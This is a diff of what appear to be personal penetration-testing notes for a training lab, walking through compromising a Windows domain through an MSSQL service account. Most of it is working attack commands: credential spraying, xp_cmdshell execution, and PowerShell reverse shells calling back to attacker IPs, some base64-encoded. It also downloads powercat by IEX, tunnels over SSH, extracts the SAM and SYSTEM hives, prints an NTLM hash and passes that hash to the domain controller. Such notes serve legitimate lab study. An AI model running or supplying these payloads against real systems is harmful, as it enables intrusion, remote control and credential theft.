@@ -332,7 +332,6 @@ crackmapexec winrm 10.10.80.148 -u sql_svc -p 'Dolphin1' --continue-on-success
 crowbar -b rdp -s 10.10.80.148/32 -u sql_svc -c "Dolphin1" -n 1
 impacket-smbexec sql_svc:Dolphin1@10.10.80.148
 evil-winrm -i 10.10.80.148 -u sql_svc -p "Dolphin1"
-crackmapexec smb 10.10.80.148 -u sql_svc -p Dolphin1 -X "$c = New-Object System.Net.Sockets.TCPClient('192.168.45.234',1234);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
 smbclient -L 10.10.80.148
 smbclient -L //10.10.80.148/ -U sql_svc --password=Dolphin1
 crackmapexec smb --exec-method atexec -u sql_svc -p 'Dolphin1' -x "whoami" 10.10.80.148
@@ -353,14 +352,6 @@ xp_cmdshell powershell netsh advfirewall firewall add rule name="test"
 protocol=TCP dir=in localip=192.168.45.234 localport=2345 action=allow
 
 xp_cmdshell powershell IEX(New-Object System.Net.WebClient).DownloadString(\"https://github.com/besimorhino/powercat/raw/master/powercat.ps1\")
-
-xp_cmdshell powershell $client = New-Object System.Net.Sockets.TCPClient("192.168.45.234",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
-
-select * from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=master
-xp_cmdshell powershell whoami /priv
-xp_cmdshell powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
-
 ```
 2. First approach would be to try accessing your kali from the machine. i) On your kali start http server using proxychains : proxychains python3 -m http.server 80 ii) On the machine try retrieving something from your kali http server. If the above approach doesn't work due to firewall. Then you may do the following:
     
@@ -370,19 +361,38 @@ xp_cmdshell powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
     - So now if you were to send a reverse shell from MACHINE02 to MACHINE01 port 4444 you'll get a shell back on your kali.
     
     NOTE: Make sure to use the right network interface IP address when trying to reach from MACHINE02 to MACHINE01. The subnet of both the machine IPs should be same. (edited)
-    
-```
-# listening socket then forwarding socket, then ssh server
-ssh -N -R 127.0.0.1:4444:10.10.110.148:445 web_svc@10.10.110.147
 
+port forwarding cheat sheet: https://www.hackingarticles.in/port-forwarding-tunnelling-cheatsheet/
+```
+# listening socket then forwarding socket, then ssh server - run this from kali to forward port 4444 on kali to a new port 4444 on web svc. sql service can only talk to web service, but not kali
 ssh -N -R 4444:127.0.0.1:4444 web_svc@192.168.220.147
-socat -ddd TCP-LISTEN:4444,fork TCP:192.168.220.147:4444
 
-
+# now we can download files and 
 enable_xp_cmdshell
-xp_cmdshell powershell IEX(New-Object System.Net.WebClient).DownloadString(\"http://10.10.110.147:4444/powercat.ps1\");powercat -c 10.10.110.147 -p 4444 -e cmd
-```
+
+xp_cmdshell powershell IEX(New-Object System.Net.WebClient).DownloadString(\"http://10.10.110.147:4444/powercat.ps1\");
+
+# from pwsh kali
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.110.147",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+
+xp_cmdshell powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAxADAALgAxADQANwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+
+# grab system files
+crackmapexec mssql 10.10.110.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\windows.old\windows\system32\SYSTEM" SYSTEM
+crackmapexec mssql 10.10.110.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\windows.old\windows\system32\SAM" SAM
+
+pypykatz registry --sam SAM SYSTEM
+
+# cannot crack this so need to use pass the hash
+# tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
+hashcat -m 1000 tomadmin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 ```
-socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+
+.146 domain controller - we have admin hash
+```
+impacket-psexec -hashes :4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.110.146
 ```
